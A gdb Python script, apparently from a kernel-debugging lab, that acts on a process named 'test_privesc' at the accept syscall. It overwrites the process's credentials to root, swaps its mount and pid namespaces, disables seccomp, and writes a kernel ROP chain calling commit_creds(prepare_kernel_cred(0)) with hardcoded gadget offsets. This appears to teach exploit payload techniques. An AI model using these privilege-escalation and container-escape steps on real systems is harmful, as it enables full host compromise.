import gdb
import sys

from typing import List

sys.path.insert(0, "/root/scripts")

from lkd.context_bp import GenericContextBP
from lkd.utils import current_pt_regs

FLAG_c = 1 << 0
FLAG_m = 1 << 1
FLAG_f = 1 << 2
FLAG_p = 1 << 3
FLAG_s = 1 << 4
FLAG_r = 1 << 5


def update_cred():
    gdb.execute("set (*$lx_current().cred).uid.val = 0")
    gdb.execute("set (*$lx_current().cred).gid.val = 0")
    gdb.execute("set (*$lx_current().cred).euid.val = 0")
    gdb.execute("set (*$lx_current().cred).egid.val = 0")
    gdb.execute(
        "set (*$lx_current().cred).cap_inheritable.cap = {0xffffffff, 0x1ff}"
    )
    gdb.execute(
        "set (*$lx_current().cred).cap_bset.cap = {0xffffffff, 0x1ff}"
    )
    gdb.execute(
        "set (*$lx_current().cred).cap_permitted.cap = {0xffffffff, 0x1ff}"
    )
    gdb.execute(
        "set (*$lx_current().cred).cap_effective.cap = {0xffffffff, 0x1ff}"
    )
    gdb.execute(
        "set (*$lx_current().cred).cap_ambient.cap = {0xffffffff, 0x1ff}"
    )


def update_mount_ns():
    gdb.execute(
        "set $lx_current().nsproxy.mnt_ns = $lx_current().parent.parent.parent.parent.nsproxy.mnt_ns"
    )
    gdb.execute(
        "set $lx_current().fs.root = $lx_current().parent.parent.parent.fs.root"
    )
    gdb.execute(
        "set $lx_current().fs.pwd = $lx_current().parent.parent.parent.fs.pwd"
    )


def disable_seccomp():
    # define TIF_SECCOMP		8
    gdb.execute("set $lx_current().thread_info.flags &= ~(1 << 8)")
    gdb.execute(
        "set $lx_current().seccomp = $lx_current().parent.parent.parent.seccomp"
    )


def update_pid_ns():
    # makes system very unstable, probably because parent is in pid
    # namespace _below_ children which is weird when they die
    gdb.execute(
        "set $lx_current().nsproxy.pid_ns_for_children = "
        "$lx_current().parent.parent.parent.nsproxy.pid_ns_for_children"
    )


def trigger_rop():
    print("Obtain saved user context")
    regs = current_pt_regs()
    print("Getting addresses of gadgets and symbols")
    kernel_base = int(gdb.parse_and_eval("(unsigned long)startup_64"))
    prepare_kernel_cred = kernel_base + 0x102BE0
    commit_creds: int = kernel_base + 0x102820
    bpf_get_current_task: int = kernel_base + 0x1CFC70
    init_fs: int = kernel_base + 0x1580380
    copy_fs_struct: int = kernel_base + 0x326220
    swapgs_restore_regs_and_return_to_usermode: int = (
        kernel_base + 0xC00EF0
    )

    pop_rdi_ret: int = 0x5C0 + kernel_base
    add_rax_rdi_ret = 0x15B0D6 + kernel_base
    push_rax_pop_rbx_ret = 0xF757F + kernel_base
    mov_qword_ptr_rbx_rax_pop_rbx_ret = 0x1084 + kernel_base
    ret = kernel_base + 0x1EC
    add_rcx_rbx_mov_rax_rcx_pop_rbx_ret = kernel_base + 0x56457
    pop_rcx_ret = kernel_base + 0x14041
    add_rdi_rcx_mov_rax_rdi_ret = kernel_base + 0x65811
    rop: List[int] = [
        pop_rdi_ret,
        0,
        prepare_kernel_cred,  # rax = prepare_kernel_cred(0)
        push_rax_pop_rbx_ret,  # rax->rbx->rcx->rdi
        pop_rdi_ret,
        0,
        pop_rcx_ret,
        0,
        add_rcx_rbx_mov_rax_rcx_pop_rbx_ret,
        -1,
        add_rdi_rcx_mov_rax_rdi_ret,
        commit_creds,  # commit_creds(prepare_kernel_cred(0))
        bpf_get_current_task,  # rax = current
        pop_rdi_ret,
        0x6E0,  # rdi = offsetof(struct task_struct, fs)
        add_rax_rdi_ret,
        push_rax_pop_rbx_ret,  # rbx = &current->fs ; callee saved
        pop_rdi_ret,
        init_fs,
        copy_fs_struct,  # rax = copy_fs_struct(init_fs)
        mov_qword_ptr_rbx_rax_pop_rbx_ret,  # current->fs = copy_fs_struct(init_fs)
        -1,
        # Can set more register when not returning to offset but who cares?
        swapgs_restore_regs_and_return_to_usermode + 22,
        int(regs["di"]), # Those registers will be correctly restored.
        -1,              # junk
        int(regs["si"]), # will become rip, was set to &return_to_here
        int(regs["cs"]),
        int(regs["flags"]),
        int(regs["sp"]),
        int(regs["ss"]),
    ]
    # normal user code does not expect syscall to clobber all registers
    # user space will likely segfault at some point after we return to
    # it
    # expoits can:
    #   - return to code that is aware of that fact and does not assume
    #     anything about registers (e.g. function with no args ...)
    #   - pivot stack to saved pt_regs and only then jump into
    #     interrupt return
    #   - resume syscall execution

    print("Write ROP chain")
    rop_start = int(gdb.parse_and_eval("$rsp - 0x1000"))
    sp = rop_start
    for item in rop:
        cmd = f"set *(unsigned long*){hex(sp)} = {hex(item)}"
        print(cmd)
        gdb.execute(cmd)
        sp += 8

    print("Setting IP and SP")
    gdb.execute(f"set $rip = {ret}")
    gdb.execute(f"set $rsp = {rop_start}")

    gdb.Breakpoint("*prepare_kernel_cred+524", temporary=True)
    gdb.Breakpoint("*commit_creds+518", temporary=True)
    gdb.Breakpoint("*copy_fs_struct+144", temporary=True)


class CloseBP(GenericContextBP):
    def _stop(self):
        cmd = gdb.parse_and_eval("regs->di")

        print(f"accept({hex(cmd)})")

        if cmd & (1 << 31):
            if cmd & FLAG_r:
                print("Trigger ROP")
                trigger_rop()
            if cmd & FLAG_c:
                print("Update cred")
                update_cred()
            if cmd & FLAG_m:
                print("Update mount ns")
                update_mount_ns()
            if cmd & FLAG_s:
                print("Disable seccomp")
                disable_seccomp()
            if cmd & FLAG_p:
                print("Update pid ns")
                update_pid_ns()

            return True
        else:
            return False


def main():
    closeBp: CloseBP = CloseBP("__x64_sys_accept", comm="test_privesc")

    gdb.execute("c")


if __name__ == "__main__":
    main()
